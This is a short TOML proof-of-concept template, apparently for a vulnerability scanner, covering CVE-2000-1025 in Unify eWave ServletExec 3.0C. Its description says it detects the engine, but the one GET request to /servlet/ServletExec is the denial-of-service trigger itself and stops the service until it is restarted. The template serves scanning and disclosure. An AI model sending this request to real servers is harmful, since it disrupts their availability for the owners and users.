[info]
author = "ave"
description = "检测目标是否运行Unify eWave ServletExec JSP/Java Servlet引擎。通过发送包含/servlet/ServletExec路径的HTTP GET请求，ServletExec引擎会尝试在80端口绑定服务线程，由于Web服务器已占用该端口，导致java.net.BindException异常，造成ServletExec服务中断，需重启ServletExec方可恢复。"
id = "POC-AVE-2000-0749"
name = "Unify eWave ServletExec 3.0C DoS PoC"
severity = "medium"
tags = ["ave-2000-0749"]
vuln_id = [
    "CVE-2000-1025",
    "AVE-2000-0749",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/servlet/ServletExec"
protocol = "http"

[[poc.requests.matchers]]
expect = true
status = [
    200,
    500,
    302,
]
type = "status"
